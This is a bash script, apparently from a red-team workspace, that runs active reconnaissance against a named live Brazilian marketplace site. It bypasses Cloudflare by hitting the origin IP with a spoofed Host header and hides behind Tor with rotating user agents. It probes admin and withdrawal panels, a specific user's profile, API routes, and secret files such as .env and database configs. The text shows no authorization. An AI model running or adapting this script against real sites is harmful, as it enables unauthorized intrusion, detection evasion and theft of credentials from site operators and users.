#!/bin/bash
# Probe key endpoints via Cloudflare BYPASS (186.226.60.54) — host header spoofing
# Rate-limited, rotating UA, via Tor (proxychains)
cd /home/ubuntu/red-team-operator/desapegogames.com.br/recon/active
ORIG="186.226.60.54"
HOSTH="desapegogames.com.br"
UAS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
)
ua() { echo "${UAS[$((RANDOM % ${#UAS[@]}))]}"; }

probe() {
  local path="$1"
  local n=$(ua)
  echo "===== $path ====="
  proxychains4 -q curl -s -k --max-time 30 -A "$n" -H "Host: $HOSTH" \
    -o "/tmp/probe_$(echo $path | tr '/?&=' '_').html" \
    -D - "https://${ORIG}${path}" 2>&1 | grep -iE "^(HTTP/|server:|content-type:|content-length:|location:|set-cookie:|cf-|x-)" | head -12
  echo "  -- title --"
  grep -oiE '<title[^>]*>[^<]*</title>' "/tmp/probe_$(echo $path | tr '/?&=' '_').html" 2>/dev/null | head -1
  echo "  -- body bytes --"
  wc -c < "/tmp/probe_$(echo $path | tr '/?&=' '_').html" 2>/dev/null
  echo ""
  sleep 2
}

{
echo "=== Content probe via Cloudflare BYPASS (Origin 186.226.60.54) ==="
echo "Host header: $HOSTH | Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""
echo "################ ADMIN / FINANCEIRO ################"
probe "/admin/"
probe "/admin/autenticacao/login"
probe "/admin/saques/"
probe "/admin/comprovantes/"
probe "/admin/dashboard"
probe "/admin/painel"
probe "/admin/login"
probe "/admin/autenticacao/logout"

echo "################ AUTH / PUBLICOS ################"
probe "/login"
probe "/cadastro"
probe "/esqueceu-senha"
probe "/perfil/administrador"
probe "/perfil/diegobtrindade"

echo "################ API v2.8 ################"
probe "/v2.8"
probe "/categoria/v2.8"
probe "/compra/v2.8"
probe "/venda/v2.8"
probe "/troca/v2.8"

echo "################ WELL-KNOWN ################"
probe "/.well-known/ai-plugin.json"
probe "/.well-known/security.txt"
probe "/robots.txt"
probe "/sitemap.xml"

echo "################ CONFIG / LEAKS ################"
probe "/.env"
probe "/application/config/production/database.php"
probe "/app/config/database.php"
probe "/composer.json"
probe "/system/"
probe "/index.php"
probe "/assets/site/js/app.js"

echo "=== PROBE DONE ==="
} | tee content_probe_bypass.txt
